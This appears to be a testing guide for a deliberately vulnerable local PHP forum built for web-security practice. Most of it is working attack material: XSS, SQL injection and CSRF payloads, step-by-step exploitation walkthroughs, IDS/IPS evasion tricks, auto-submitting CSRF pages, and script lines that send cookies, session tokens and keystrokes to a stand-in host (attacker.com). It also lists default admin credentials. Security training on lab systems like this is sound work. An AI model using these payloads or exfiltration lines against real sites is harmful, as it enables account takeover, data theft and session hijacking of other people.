# 🎯 Vulnerable Forum Testing Guide

## ✅ System Status: COMPLETE & READY

The vulnerable forum system has been successfully created and is ready for security testing. All intentional vulnerabilities are implemented and functional.

## 🚀 Quick Start

1. **Start Laragon** and ensure MySQL is running
2. **Access Forum**: http://localhost/Musywar
3. **Admin Login**: username `admin`, password `password`
4. **Begin Testing**: Use the payloads and techniques below

## 🔓 Implemented Vulnerabilities

### 1. Cross-Site Scripting (XSS)
**Locations:**
- Post creation and editing
- Reply/comment submission  
- Search functionality
- User profiles
- Admin panel

**Test Payloads:**
```html
<script>alert("XSS")</script>
<img src=x onerror=alert(1)>
<svg onload=alert("SVG XSS")>
<input onfocus=alert("input") autofocus>
```

**Evasion Techniques:**
```html
<scr<script>ipt>alert("bypass")</script>
<SCRIPT>alert("case bypass")</SCRIPT>
<script>window["ale"+"rt"]("concat")</script>
```

### 2. SQL Injection
**Locations:**
- Login form (username/password)
- Search functionality
- User management (admin)
- Post filtering

**Test Payloads:**
```sql
admin' OR '1'='1' --
' OR 1=1 --
' UNION SELECT user(), database() --
' UN/**/ION SEL/**/ECT @@version --
```

**Evasion Techniques:**
```sql
' uNiOn sElEcT (case variation)
' UN/**/ION (comment injection)
' OR 1=1 %23 (URL encoding)
```

### 3. Cross-Site Request Forgery (CSRF)
**Vulnerable Actions:**
- All admin operations
- User profile updates
- Post/reply submission
- Password changes

**Test Method:**
```html
<form action="http://localhost/Musywar/admin/users.php" method="POST">
    <input name="action" value="delete_user">
    <input name="user_id" value="3">
    <script>document.forms[0].submit();</script>
</form>
```

## 🛠️ Testing Tools

### 1. Manual Testing Interface
- **File**: `test-payloads.html`
- **URL**: http://localhost/Musywar/test-payloads.html
- **Features**: Ready-to-use payload forms

### 2. Python Testing Script
```bash
python evasion_tester.py
```
**Options:**
- Manual testing guide
- Automated vulnerability detection

### 3. Browser DevTools
- Monitor network requests
- Check for XSS execution
- Analyze response content

## 📍 Key Testing Locations

| Location | Vulnerability | Method |
|----------|---------------|---------|
| `/login.php` | SQL Injection | POST username/password |
| `/search.php` | XSS + SQLi | GET parameter `q` |
| `/create-post.php` | XSS + CSRF | POST title/content |
| `/submit-comment.php` | XSS + CSRF | POST content |
| `/admin/users.php` | All vulnerabilities | Various actions |
| `/admin/posts.php` | All vulnerabilities | Various actions |

## 🎯 Specific Test Scenarios

### Scenario 1: Admin Account Compromise
1. Navigate to login page
2. Use SQL injection: `admin' OR '1'='1' --`
3. Bypass authentication and access admin panel

### Scenario 2: Persistent XSS
1. Create new post with XSS payload
2. Payload executes for all users viewing the post
3. Demonstrates stored XSS vulnerability

### Scenario 3: Search-Based Attacks
1. Use search with XSS payload
2. Combine with SQL injection for data extraction
3. Test both reflected XSS and blind SQLi

### Scenario 4: CSRF Attack Chain
1. Craft malicious form targeting admin actions
2. Social engineer admin to visit attacker page
3. Execute unauthorized administrative actions

---

## 🔥 DETAILED ATTACK TECHNIQUES

### 🚨 1. Cross-Site Scripting (XSS) Attacks

#### **A. Reflected XSS via Search**
**Target:** `search.php`
**Steps:**
```bash
1. Navigate to: http://localhost/Musywar/search.php
2. In search box, enter: <script>alert('XSS')</script>
3. Submit search
4. JavaScript executes immediately
```

**Advanced Payloads:**
```html
# Cookie theft
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

# Session hijacking
<script>fetch('http://attacker.com/log.php?session='+document.cookie)</script>

# Keylogger
<script>document.addEventListener('keypress',function(e){fetch('http://attacker.com/keys.php?key='+e.key)})</script>
```

#### **B. Stored XSS via Post Creation**
**Target:** `create-post.php`
**Steps:**
```bash
1. Login as any user
2. Navigate to: Create New Post
3. Title: "Normal Post Title"
4. Content: <img src=x onerror="alert('Stored XSS')">
5. Submit post
6. XSS executes for every user who views the post
```

**Persistent Payloads:**
```html
# Admin cookie theft
<script>if(document.cookie.includes('admin')){fetch('http://attacker.com/admin.php?c='+document.cookie)}</script>

# Redirect admin to malicious site
<script>if(window.location.href.includes('admin')){window.location='http://malicious-site.com'}</script>

# Auto-post spam
<script>setTimeout(function(){document.querySelector('form').submit()},2000)</script>
```

#### **C. DOM-Based XSS**
**Target:** Any page with URL hash processing
**Steps:**
```bash
1. Craft URL: http://localhost/Musywar/index.php#<script>alert('DOM XSS')</script>
2. Send to victim
3. JavaScript executes when page loads
```

### 🚨 2. SQL Injection Attacks

#### **A. Authentication Bypass**
**Target:** `login.php`
**Steps:**
```bash
1. Navigate to login page
2. Username: admin' OR '1'='1' --
3. Password: anything
4. Click login
5. Successfully bypass authentication
```

**Advanced Auth Bypass:**
```sql
# Multiple variations
admin'/**/OR/**/'1'='1'/**/--
admin' OR 1=1#
admin' OR 'x'='x
admin'||'1'='1
' OR 1=1 LIMIT 1 --
```

#### **B. Data Extraction via UNION**
**Target:** `search.php`
**Steps:**
```bash
1. Navigate to search
2. Enter: ' UNION SELECT user(),database() --
3. Check results for database info
4. Escalate: ' UNION SELECT username,password FROM users --
```

**Progressive UNION Attacks:**
```sql
# 1. Find column count
' ORDER BY 5 --  (test until error)

# 2. Find injectable columns
' UNION SELECT 1,2,3,4 --

# 3. Extract database info
' UNION SELECT database(),version(),user(),@@hostname --

# 4. List tables
' UNION SELECT table_name,1,1,1 FROM information_schema.tables WHERE table_schema='forum_masyarakat' --

# 5. Extract user data
' UNION SELECT username,password,email,role FROM users --
```

#### **C. Blind SQL Injection**
**Target:** Login or search with no direct output
**Steps:**
```bash
1. Test time-based: admin' AND SLEEP(5) --
2. If delay occurs, vulnerability confirmed
3. Extract data bit by bit
```

**Blind Extraction:**
```sql
# Check if first char of admin password is 'a'
admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --

# Time-based extraction
admin' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0) --
```

### 🚨 3. Cross-Site Request Forgery (CSRF) Attacks

#### **A. Admin User Deletion**
**Target:** `admin/users.php`
**Attack Page:**
```html
<!DOCTYPE html>
<html>
<head><title>Innocent Page</title></head>
<body>
<h1>Click here for free prize!</h1>
<form id="csrf" action="http://localhost/Musywar/admin/users.php" method="POST">
    <input type="hidden" name="action" value="delete_user">
    <input type="hidden" name="user_id" value="3">
</form>
<script>
    // Auto-submit when page loads
    document.getElementById('csrf').submit();
</script>
</body>
</html>
```

**Steps:**
```bash
1. Save above HTML as csrf-attack.html
2. Admin user must be logged in
3. Trick admin to visit csrf-attack.html
4. User ID 3 gets deleted automatically
```

#### **B. Mass Post Creation**
**Target:** `create-post.php`
```html
<form action="http://localhost/Musywar/create-post.php" method="POST">
    <input type="hidden" name="title" value="Spam Post">
    <input type="hidden" name="content" value="<script>alert('CSRF XSS Combo')</script>">
    <input type="hidden" name="category" value="1">
</form>
<script>document.forms[0].submit();</script>
```

#### **C. Admin Settings Change**
**Target:** Admin profile/settings
```html
<img src="http://localhost/Musywar/admin/users.php?action=promote&user_id=5&role=admin" style="display:none">
```

### 🚨 4. Advanced Attack Combinations

#### **A. XSS + CSRF Chain**
**Objective:** Use XSS to perform CSRF attacks
```javascript
// Inject via XSS to perform CSRF
<script>
var form = document.createElement('form');
form.method = 'POST';
form.action = '/admin/users.php';
form.innerHTML = '<input name="action" value="delete_user"><input name="user_id" value="3">';
document.body.appendChild(form);
form.submit();
</script>
```

#### **B. SQLi + XSS Combo**
**Target:** Search function
```sql
' UNION SELECT '<script>alert("SQLi+XSS")</script>',2,3,4 --
```

#### **C. Privilege Escalation Chain**
**Steps:**
```bash
1. SQLi to extract admin session
2. Session hijacking via XSS
3. CSRF to create new admin user
4. Full system compromise
```

### 🚨 5. IDS/IPS Evasion Techniques

#### **A. SQL Injection Evasion**
```sql
# Case variation
' uNiOn SeLeCt user() --

# Comment injection
' UN/**/ION SE/**/LECT user() --

# Encoding
' %55NION %53ELECT user() --

# Function replacement
' UNION(SELECT(user())) --
```

#### **B. XSS Evasion**
```javascript
// String concatenation
<script>eval('ale'+'rt("XSS")')</script>

// Character codes
<script>alert(String.fromCharCode(88,83,83))</script>

// Event handlers
<svg/onload=alert`XSS`>

// Protocol handlers
<a href="javascript:alert('XSS')">Click</a>
```

#### **C. CSRF Token Bypass**
```bash
# Since forum has NO CSRF tokens, all requests are vulnerable
# In real scenarios, try:
# - Token prediction
# - Token extraction via XSS
# - Subdomain attacks
```

---

## 🔍 IDS/IPS Evasion Features

The forum implements several evasion techniques:

### Character Encoding
- URL encoding: `%3Cscript%3E`
- HTML entities: `&lt;script&gt;`
- Unicode variations

### Case Variation
- Mixed case SQL: `UnIoN sElEcT`
- Mixed case HTML: `<ScRiPt>`

### Comment Injection
- SQL comments: `/**/` between keywords
- HTML comments: `<!-- -->`

### Obfuscation
- String concatenation in JavaScript
- Character code conversion
- DOM-based XSS vectors

## ⚠️ Important Notes

1. **Authorization Only**: Use only on systems you own or have explicit permission to test
2. **Educational Purpose**: Designed for learning web security concepts
3. **Production Warning**: Never deploy this system in a production environment
4. **Responsible Disclosure**: If adapting for real testing, follow responsible disclosure practices

## 🔧 System Information

- **Database**: MySQL (forum_masyarakat)
- **Default Users**: admin, moderator, john_doe, jane_smith, bob_wilson
- **Default Password**: `password` (for all users)
- **Admin Panel**: `/admin/`
- **API Endpoint**: `/api/stats.php`

## 📚 Documentation Files

- `README.md` - Main project documentation
- `INSTALLATION.md` - Setup instructions  
- `database/schema_simple.sql` - Database structure
- `test-payloads.html` - Browser testing interface
- `evasion_tester.py` - Automated testing script

## ✅ Testing Checklist

- [ ] XSS in post creation
- [ ] XSS in comments/replies  
- [ ] XSS in search results
- [ ] SQL injection in login
- [ ] SQL injection in search
- [ ] CSRF in admin actions
- [ ] Information disclosure
- [ ] Session management flaws
- [ ] File upload vulnerabilities
- [ ] Privilege escalation

---

**Happy Testing! 🔐**

Remember: This system is intentionally vulnerable for educational purposes. Always test responsibly and ethically.
